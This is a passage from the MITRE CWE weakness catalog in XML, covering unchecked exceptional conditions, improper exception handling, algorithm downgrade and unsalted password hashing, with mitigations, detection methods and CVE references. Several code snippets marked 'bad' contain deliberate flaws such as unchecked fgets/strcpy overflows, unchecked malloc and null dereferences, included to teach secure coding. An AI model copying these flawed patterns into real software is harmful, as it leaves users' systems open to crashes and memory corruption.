            <xhtml:p>The programmer may assume that certain events or conditions will never occur or do not need to be worried about, such as low memory conditions, lack of access to resources due to restrictive permissions, or misbehaving clients or components. However, attackers may intentionally trigger these unusual conditions, thus violating the programmer's assumptions, possibly introducing instability, incorrect behavior, or a vulnerability.</xhtml:p>
            <xhtml:p>Note that this entry is not exclusively about the use of exceptions and exception handling, which are mechanisms for both checking and handling unusual or unexpected conditions.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="703" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="703" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Many functions will return some value about the success of their actions. This will alert the program whether or not to handle any errors caused by that function.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>Unexpected State</Impact>
               <Note>The data which were produced as a result of a function call could be in a bad state upon return. If the return value is not checked, then this bad data may be used in operations, possibly leading to a crash or other unintended behaviors.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Automated static analysis may be useful for detecting unusual conditions involving system resources or common programming idioms, but not for violations of business rules.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-12">
               <Method>Manual Dynamic Analysis</Method>
               <Description>Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.</Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-3">
               <Phase>Requirements</Phase>
               <Strategy>Language Selection</Strategy>
               <Description>
                  <xhtml:p>Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Choose languages with features such as exception handling that force the programmer to anticipate unusual conditions that may generate exceptions. Custom exceptions may need to be developed to handle unusual business-logic conditions. Be careful not to pass sensitive exceptions back to the user (CWE-209, CWE-248).</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Check the results of all functions that return a value and verify that the value is expected.</Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If using exception handling, catch and throw specific exceptions instead of overly-general exceptions (CWE-396, CWE-397). Catch and handle exceptions as locally as possible so that exceptions do not propagate too far up the call stack (CWE-705). Avoid unchecked or uncaught exceptions where feasible (CWE-248).</Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>Using specific exceptions, and ensuring that exceptions are checked, helps programmers to anticipate and appropriately handle many unusual events that could occur.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.</xhtml:p>
                  <xhtml:p>If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.</xhtml:p>
                  <xhtml:p>Exposing additional information to a potential attacker in the context of an exceptional condition can help the attacker determine what attack vectors are most likely to succeed beyond DoS.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
               <Effectiveness_Notes>Performing extensive input validation does not help with handling unusual conditions, but it will minimize their occurrences and will make it more difficult for attackers to trigger them.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-38">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>If the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use system limits, which should help to prevent resource exhaustion. However, the software should still handle low resource conditions since they may still occur.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-7">
               <Intro_Text>Consider the following code segment:</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>char buf[10], cp_buf[10];<xhtml:br/>fgets(buf, 10, stdin);<xhtml:br/>strcpy(cp_buf, buf);</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer expects that when fgets() returns, buf will contain a null-terminated string of length 9 or less. But if an I/O error occurs, fgets() will not null-terminate buf. Furthermore, if the end of the file is reached before any characters are read, fgets() returns without writing anything to buf. In both of these situations, fgets() signals that something unusual has happened by returning NULL, but in this code, the warning will not be noticed. The lack of a null terminator in buf can result in a buffer overflow in the subsequent call to strcpy().</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-8">
               <Intro_Text>The following code does not check to see if memory allocation succeeded before attempting to use the pointer returned by malloc().</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>buf = (char*) malloc(req_size);<xhtml:br/>strncpy(buf, xfer, req_size);</xhtml:div>
               </Example_Code>
               <Body_Text>The traditional defense of this coding error is: "If my program runs out of memory, it will fail. It doesn't matter whether I handle the error or simply allow the program to die with a segmentation fault when it tries to dereference the null pointer." This argument ignores three important considerations:</Body_Text>
               <Body_Text>
                  <xhtml:ul>
                     <xhtml:li>
                        <xhtml:div>Depending upon the type and size of the application, it may be possible to free memory that is being used elsewhere so that execution can continue.</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>It is impossible for the program to perform a graceful exit if required. If the program is performing an atomic operation, it can leave the system in an inconsistent state.</xhtml:div>
                     </xhtml:li>
                     <xhtml:li>
                        <xhtml:div>The programmer has lost the opportunity to record diagnostic information. Did the call to malloc() fail because req_size was too large or because there were too many requests being handled at the same time? Or was it caused by a memory leak that has built up over time? Without handling the error, there is no way to know.</xhtml:div>
                     </xhtml:li>
                  </xhtml:ul>
               </Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-9">
               <Intro_Text>The following examples read a file into a byte array.</Intro_Text>
               <Example_Code Nature="bad" Language="C#">
                  <xhtml:div>char[] byteArray = new char[1024];<xhtml:br/>for (IEnumerator i=users.GetEnumerator(); i.MoveNext() ;i.Current()) {<xhtml:div style="margin-left:10px;">String userName = (String) i.Current();<xhtml:br/>String pFileName = PFILE_ROOT + "/" + userName;<xhtml:br/>StreamReader sr = new StreamReader(pFileName);<xhtml:br/>sr.Read(byteArray,0,1024);//the file is always 1k bytes<xhtml:br/>sr.Close();<xhtml:br/>processPFile(userName, byteArray);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>FileInputStream fis;<xhtml:br/>byte[] byteArray = new byte[1024];<xhtml:br/>for (Iterator i=users.iterator(); i.hasNext();) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>String userName = (String) i.next();<xhtml:br/>String pFileName = PFILE_ROOT + "/" + userName;<xhtml:br/>FileInputStream fis = new FileInputStream(pFileName);<xhtml:br/>fis.read(byteArray); // the file is always 1k bytes<xhtml:br/>fis.close();<xhtml:br/>processPFile(userName, byteArray);<xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>The code loops through a set of users, reading a private data file for each user. The programmer assumes that the files are always 1 kilobyte in size and therefore ignores the return value from Read(). If an attacker can create a smaller file, the program will recycle the remainder of the data from the previous user and treat it as though it belongs to the attacker.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-10">
               <Intro_Text>The following code does not check to see if the string returned by getParameter() is null before calling the member function compareTo(), potentially causing a NULL dereference.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String itemName = request.getParameter(ITEM_NAME);<xhtml:br/>if (itemName.compareTo(IMPORTANT_ITEM) == 0) {<xhtml:div style="margin-left:10px;">...</xhtml:div>}<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following code does not check to see if the string returned by the Item property is null before calling the member function Equals(), potentially causing a NULL dereference.</Body_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String itemName = request.Item(ITEM_NAME);<xhtml:br/>if (itemName.Equals(IMPORTANT_ITEM)) {<xhtml:div style="margin-left:10px;">...</xhtml:div>}<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The traditional defense of this coding error is: "I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value." But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-11">
               <Intro_Text>The following code shows a system property that is set to null and later dereferenced by a programmer who mistakenly assumes it will always be defined.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>System.clearProperty("os.name");<xhtml:br/>...<xhtml:br/>String os = System.getProperty("os.name");<xhtml:br/>if (os.equalsIgnoreCase("Windows 95")) System.out.println("Not supported");</xhtml:div>
               </Example_Code>
               <Body_Text>The traditional defense of this coding error is: "I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value." But attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-12">
               <Intro_Text>The following VB.NET code does not check to make sure that it has read 50 bytes from myfile.txt. This can cause DoDangerousOperation() to operate on an unexpected value.</Intro_Text>
               <Example_Code Nature="bad" Language="C#">
                  <xhtml:div>Dim MyFile As New FileStream("myfile.txt", FileMode.Open, FileAccess.Read, FileShare.Read)<xhtml:br/>Dim MyArray(50) As Byte<xhtml:br/>MyFile.Read(MyArray, 0, 50)<xhtml:br/>DoDangerousOperation(MyArray(20))</xhtml:div>
               </Example_Code>
               <Body_Text>In .NET, it is not uncommon for programmers to misunderstand Read() and related methods that are part of many System.IO classes. The stream and reader classes do not consider it to be unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-1">
               <Intro_Text>This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>void host_lookup(char *user_supplied_addr){<xhtml:div style="margin-left:10px;">
                        <xhtml:div>struct hostent *hp;<xhtml:br/>in_addr_t *addr;<xhtml:br/>char hostname[64];<xhtml:br/>in_addr_t inet_addr(const char *cp);<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>/*routine that ensures user_supplied_addr is in the right format for conversion */</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>validate_addr_form(user_supplied_addr);<xhtml:br/>addr = inet_addr(user_supplied_addr);<xhtml:br/>hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);<xhtml:br/>strcpy(hostname, hp-&gt;h_name);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. When this occurs, a NULL pointer dereference (CWE-476) will occur in the call to strcpy().</Body_Text>
               <Body_Text>Note that this example is also vulnerable to a buffer overflow (see CWE-119).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the following C/C++ example the method outputStringToFile opens a file in the local filesystem and outputs a string to the file. The input parameters output and filename contain the string to output to the file and the name of the file respectively.</Intro_Text>
               <Example_Code Nature="bad" Language="C++">
                  <xhtml:div>int outputStringToFile(char *output, char *filename) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:br/>openFileToWrite(filename);<xhtml:br/>writeToFile(output);<xhtml:br/>closeFile(filename);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, this code does not check the return values of the methods openFileToWrite, writeToFile, closeFile to verify that the file was properly opened and closed and that the string was successfully written to the file. The return values for these methods should be checked to determine if the method was successful and allow for detection of errors or unexpected conditions as in the following example.</Body_Text>
               <Example_Code Nature="good" Language="C++">
                  <xhtml:div>int outputStringToFile(char *output, char *filename) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>int isOutput = SUCCESS;<xhtml:br/>
                           <xhtml:br/>int isOpen = openFileToWrite(filename);<xhtml:br/>if (isOpen == FAIL) {<xhtml:div style="margin-left:10px;">printf("Unable to open file %s", filename);<xhtml:br/>isOutput = FAIL;</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>int isWrite = writeToFile(output);<xhtml:br/>if (isWrite == FAIL) {<xhtml:div style="margin-left:10px;">printf("Unable to write to file %s", filename);<xhtml:br/>isOutput = FAIL;</xhtml:div>}<xhtml:br/>
                                 <xhtml:br/>int isClose = closeFile(filename);<xhtml:br/>if (isClose == FAIL)<xhtml:div style="margin-left:10px;">isOutput = FAIL;</xhtml:div>
                              </xhtml:div>
                           </xhtml:div>}<xhtml:br/>return isOutput;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the following Java example the method readFromFile uses a FileReader object to read the contents of a file. The FileReader object is created using the File object readFile, the readFile object is initialized using the setInputFile method. The setInputFile method should be called before calling the readFromFile method.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>private File readFile = null;<xhtml:br/>
                     <xhtml:br/>public void setInputFile(String inputFile) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// create readFile File object from string containing name of file</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>public void readFromFile() {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>try {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>reader = new FileReader(readFile);<xhtml:br/>
                                 <xhtml:br/>
                                 <xhtml:i>// read input file</xhtml:i>
                                 <xhtml:br/>
                              </xhtml:div>
                           </xhtml:div>} catch (FileNotFoundException ex) {...}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, the readFromFile method does not check to see if the readFile object is null, i.e. has not been initialized, before creating the FileReader object and reading from the input file. The readFromFile method should verify whether the readFile object is null and output an error message and raise an exception if the readFile object is null, as in the following code.</Body_Text>
               <Example_Code Nature="good" Language="Java">
                  <xhtml:div>private File readFile = null;<xhtml:br/>
                     <xhtml:br/>public void setInputFile(String inputFile) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// create readFile File object from string containing name of file</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>public void readFromFile() {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>try {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>if (readFile == null) {<xhtml:div style="margin-left:10px;">System.err.println("Input file has not been set, call setInputFile method before calling openInputFile");<xhtml:br/>throw NullPointerException;</xhtml:div>}<xhtml:br/>
                                 <xhtml:br/>reader = new FileReader(readFile);<xhtml:br/>
                                 <xhtml:br/>
                                 <xhtml:i>// read input file</xhtml:i>
                                 <xhtml:br/>
                              </xhtml:div>
                           </xhtml:div>} catch (FileNotFoundException ex) {...}<xhtml:br/>catch (NullPointerException ex) {...}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2007-3798</Reference>
               <Description>Unchecked return value leads to resultant integer overflow and code execution.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3798</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4447</Reference>
               <Description>Program does not check return value when invoking functions to drop privileges, which could leave users with higher privileges than expected by forcing those functions to fail.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4447</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2916</Reference>
               <Description>Program does not check return value when invoking functions to drop privileges, which could leave users with higher privileges than expected by forcing those functions to fail.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2916</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Perl Coding Standard">
               <Entry_ID>EXP31-PL</Entry_ID>
               <Entry_Name>Do not suppress or ignore exceptions</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 7, &#34;Program Building Blocks&#34; Page 341"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 1, &#34;Exceptional Conditions,&#34; Page 22"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 11: Failure to Handle Errors Correctly.&#34; Page 183"/>
            <Reference External_Reference_ID="REF-622"/>
         </References>
         <Notes>
            <Note Type="Relationship">Sometimes, when a return value can be used to indicate an error, an unchecked return value is a code-layer instance of a missing application-layer check for exceptional conditions. However, return values are not always needed to communicate exceptional conditions. For example, expiration of resources, values passed by reference, asynchronously modified data, sockets, etc. may indicate exceptional conditions without the use of a return value.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="755" Name="Improper Handling of Exceptional Conditions" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The software does not handle or incorrectly handles an exceptional condition.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="703" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="703" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-4302</Reference>
               <Description>Chain: OS kernel does not properly handle a failure of a function call (CWE-755), leading to an unlock of a resource that was not locked (CWE-832), with resultant crash.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4302</Link>
            </Observed_Example>
         </Observed_Examples>
         
      </Weakness>
      <Weakness ID="757" Name="Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>A protocol or its implementation supports interaction between multiple actors and allows those actors to negotiate which algorithm should be used as a protection mechanism such as encryption or authentication, but it does not select the strongest algorithm that is available to both parties.</Description>
         <Extended_Description>When a security mechanism can be forced to downgrade to use a less secure algorithm, this can make it easier for attackers to compromise the software by exploiting weaker algorithm. The victim might not be aware that the less secure algorithm is being used. For example, if an attacker can force a communications channel to use cleartext instead of strongly-encrypted data, then the attacker could read the channel by sniffing, instead of going through extra effort of trying to decrypt the data using brute force techniques.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2006-4302</Reference>
               <Description>Attacker can select an older version of the software to exploit its vulnerabilities.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4302</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4407</Reference>
               <Description>Improper prioritization of encryption ciphers during negotiation leads to use of a weaker cipher.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4407</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2969</Reference>
               <Description>chain: SSL/TLS implementation disables a verification step (CWE-325) that enables a downgrade attack to a weaker protocol.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2969</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1444</Reference>
               <Description>Telnet protocol implementation allows downgrade to weaker authentication and encryption using a man-in-the-middle attack.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1444</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1646</Reference>
               <Description>SSH server implementation allows override of configuration setting to use weaker authentication schemes. This may be a composite with CWE-642.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1646</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="220"/>
            <Related_Attack_Pattern CAPEC_ID="606"/>
            <Related_Attack_Pattern CAPEC_ID="620"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">This is related to CWE-300 (Man-in-the-Middle), although not all downgrade attacks necessarily require a man in the middle. See examples.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="759" Name="Use of a One-Way Hash without a Salt" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the software does not also use a salt as part of the input.</Description>
         <Extended_Description>
            <xhtml:p>This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables.</xhtml:p>
            <xhtml:p>It should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="916" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="916" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Background_Details>
            <Background_Detail>In cryptography, salt refers to some random addition of data to an input before hashing to make dictionary attacks more difficult.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>If an attacker can gain access to the hashes, then the lack of a salt makes it easier to conduct brute force attacks using techniques such as rainbow tables.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
